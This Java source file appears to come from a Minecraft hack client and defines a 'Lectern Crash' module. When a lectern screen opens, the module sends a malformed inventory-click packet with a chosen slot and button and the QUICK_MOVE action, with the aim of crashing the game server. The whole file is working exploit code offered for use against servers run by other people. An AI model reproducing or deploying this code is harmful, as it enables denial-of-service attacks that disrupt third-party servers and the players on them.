package mathax.client.systems.modules.crash;

import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import mathax.client.eventbus.EventHandler;
import mathax.client.events.game.GameLeftEvent;
import mathax.client.events.game.OpenScreenEvent;
import mathax.client.settings.BoolSetting;
import mathax.client.settings.IntSetting;
import mathax.client.settings.Setting;
import mathax.client.settings.SettingGroup;
import mathax.client.systems.modules.Categories;
import mathax.client.systems.modules.Module;
import net.minecraft.client.gui.screen.ingame.LecternScreen;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;

import java.util.Objects;

import static mathax.client.MatHax.LOG;

public class LecternCrash extends Module {

    private final Setting<Integer> slot;

    private final Setting<Integer> button;

    private final Setting<Boolean> autoDisable;

    public LecternCrash() {
        super(Categories.Crash, Items.LECTERN, "Lectern Crash", "CRYSTAL || Sends broken packets while using a lectern.");
        SettingGroup sgGeneral = settings.getDefaultGroup();
        slot = sgGeneral.add(new IntSetting.Builder()
            .name("slot")
            .description("Number of the slot")
            .defaultValue(0)
            .min(0)
            .sliderMin(0)
            .sliderMax(9)
            .build()
        );
        button = sgGeneral.add(new IntSetting.Builder()
            .name("button")
            .description("Number of the button.")
            .defaultValue(0)
            .min(0)
            .sliderMin(0)
            .sliderMax(10)
            .build()
        );
        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build()
        );
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    @EventHandler
    private void onOpenScreenEvent(OpenScreenEvent event) {
        try {
            if (event.screen instanceof LecternScreen) {
                if (mc.player != null && mc.world != null) {
                    Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId, mc.player.currentScreenHandler.getRevision(), slot.get(), button.get(), SlotActionType.QUICK_MOVE, mc.player.currentScreenHandler.getCursorStack().copy(), Int2ObjectMaps.emptyMap()));
                    toggle();
                }
            } else {
                return;
            }

        } catch(NullPointerException NPE) {
            LOG.error("NullPointerException for LecternCrash onOpenScreenEvent: ", NPE);
        }

    }
}
